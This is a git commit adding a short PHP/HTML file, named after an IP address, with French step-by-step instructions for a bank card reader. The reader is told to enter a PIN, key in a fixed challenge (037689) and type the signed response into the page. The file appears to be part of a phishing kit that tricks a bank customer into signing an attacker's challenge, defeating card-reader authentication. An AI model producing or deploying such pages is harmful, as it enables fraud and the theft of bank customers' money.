08e12d95e21fcd4b9cae1b15982e000c34b7c14d
parfume1900 <justyouar1988@gmail.com>
2025-02-23 15:19:58 +0000

    Add files via upload

---
+++ data/196.93.87.179.php
@@ -0,0 +1,5 @@
+<p> 1-Insérez votre carte dans lecteur appuyez [SIGN] </p>
+<p> 2-indiquez votre code PIN appuyez [OK] </p>
+<p> 3- introduisez CHALLENGE ( 0 ) et appuyez [OK ] </p>
+<p> 4-introduisez CHALLENGE [037689] et appuyez [SIGN ] </p>
+<p> 5-indiquez la réponse ici </p>
